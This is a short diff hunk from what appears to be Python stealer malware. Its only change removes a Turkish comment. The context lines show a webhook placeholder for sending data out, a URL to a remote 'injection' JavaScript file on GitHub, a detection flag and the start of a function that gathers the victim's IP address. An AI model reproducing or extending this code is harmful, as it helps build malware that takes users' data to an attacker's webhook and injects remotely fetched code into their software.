@@ -53,7 +53,7 @@ wh00k = "WEBHOOK HERE"
 inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
     
 DETECTED = False
-#bir ucaktik dustuk bir gemiydik battik :(
+
 def g3t1p():
     ip = "None"
     try:
